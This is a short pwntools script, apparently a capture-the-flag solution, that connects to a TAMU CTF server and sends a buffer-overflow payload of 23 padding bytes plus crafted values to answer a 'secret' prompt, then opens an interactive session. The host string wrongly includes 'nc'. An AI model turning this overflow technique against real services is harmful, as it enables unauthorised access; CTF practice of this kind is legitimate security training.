#!/usr/bin/python
from pwn import *

r = remote('nc pwn.ctf.tamu.edu', 4321)

r.recvuntil('What is my secret?')

payload = 'A'*23+'\x00\x0F\x00\x00\x07\x0B\x0A\x01\x01'

r.writeline(payload)

r.interactive()